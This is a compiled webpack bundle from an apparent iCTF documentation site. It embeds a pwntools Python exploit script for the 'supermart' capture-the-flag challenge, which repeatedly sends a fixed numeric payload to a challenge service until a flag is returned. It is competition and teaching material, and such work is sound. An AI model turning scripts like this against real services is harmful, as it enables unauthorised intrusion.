"use strict";(self.webpackChunkictf_docs=self.webpackChunkictf_docs||[]).push([[1054],{293:(e,r,t)=>{t.r(r),t.d(r,{assets:()=>i,contentTitle:()=>a,default:()=>d,frontMatter:()=>s,metadata:()=>c,toc:()=>l});var n=t(4848),o=t(8453);const s={},a=void 0,c={id:"challenges/supermart/exploit.py",title:"exploit.py",description:"",source:"@site/docs/challenges/supermart/exploit.py.md",sourceDirName:"challenges/supermart",slug:"/challenges/supermart/exploit.py",permalink:"/ictf-docs/challenges/supermart/exploit.py",draft:!1,unlisted:!1,editUrl:"https://github.com/ucsb-seclab/ictf-docs/tree/main/docs/challenges/supermart/exploit.py.md",tags:[],version:"current",frontMatter:{},sidebar:"challenges",previous:{title:"supermart",permalink:"/ictf-docs/challenges/supermart/"},next:{title:"Tensormania",permalink:"/ictf-docs/challenges/tensormania/"}},i={},l=[];function p(e){const r={code:"code",pre:"pre",...(0,o.R)(),...e.components};return(0,n.jsx)(r.pre,{children:(0,n.jsx)(r.code,{className:"language-python",children:"from pwn import *\r\nimport argparse\r\n\r\nparser = argparse.ArgumentParser()\r\n\r\nparser.add_argument('--host', help='Host to connect to', default='localhost')\r\nparser.add_argument('--port', help='Port to connect to', default=1337, type=int)\r\n\r\nargs = parser.parse_args()\r\n\r\n# NOTE: we need to do this a few times to get the flag because it is\r\n# randomized\r\nfor _ in range(10):\r\n    r = remote(args.host, args.port)\r\n\r\n    exploit = \"\"\"0x21,100,0x42,100,0x4C,100,0x6,100,0x59,100\\n\"\"\"\r\n\r\n    r.sendline(exploit.encode())\r\n\r\n    got = r.recvall().decode()\r\n\r\n    if '{' in got:\r\n        print(got)\r\n        break\r\n    else:\r\n        print('Failed to get flag; trying again')\r\n\r\n    r.close()\r\nelse:\r\n    print('Failed to get flag')\n"})})}function d(e={}){const{wrapper:r}={...(0,o.R)(),...e.components};return r?(0,n.jsx)(r,{...e,children:(0,n.jsx)(p,{...e})}):p(e)}},8453:(e,r,t)=>{t.d(r,{R:()=>a,x:()=>c});var n=t(6540);const o={},s=n.createContext(o);function a(e){const r=n.useContext(s);return n.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function c(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),n.createElement(s.Provider,{value:r},e.children)}}}]);